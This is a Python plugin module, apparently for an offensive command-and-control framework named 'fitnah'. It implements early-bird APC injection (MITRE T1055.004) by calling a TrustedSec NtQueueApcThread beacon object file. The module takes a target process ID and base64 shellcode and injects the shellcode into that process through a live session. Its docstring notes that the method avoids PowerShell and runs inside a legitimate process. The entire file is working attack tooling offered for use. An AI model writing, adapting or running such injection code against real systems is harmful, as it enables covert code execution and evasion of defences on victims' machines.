"""execution/early_bird_apc — early-bird APC injection via NtQueueApcThread BOF. MITRE T1055.004

BOF: TrustedSec ntqueueapcthread (CS-Remote-OPs-BOF)
Args: "ib" — int32 pid, bytes shellcode
No PowerShell. Queues APC before user-space code runs — shellcode executes on first
alertable wait inside a legitimate suspended process.
"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class EarlyBirdApc(BasePlugin):
    NAME        = "early_bird_apc"
    DESCRIPTION = "APC injection into alertable-wait thread via NtQueueApcThread BOF. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.004"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",           int, required=True,  help="Target PID"),
        Param("shellcode_b64", str, required=True,  help="Base64-encoded shellcode"),
    )

    @mitre("T1055.004")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid  = int(params["pid"])
        sc   = base64.b64decode(params["shellcode_b64"].strip())
        args = ctx.bof_pack("ib", pid, sc)
        r    = ctx.bof("ntqueueapcthread", args_b64=args, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"early_bird_apc failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
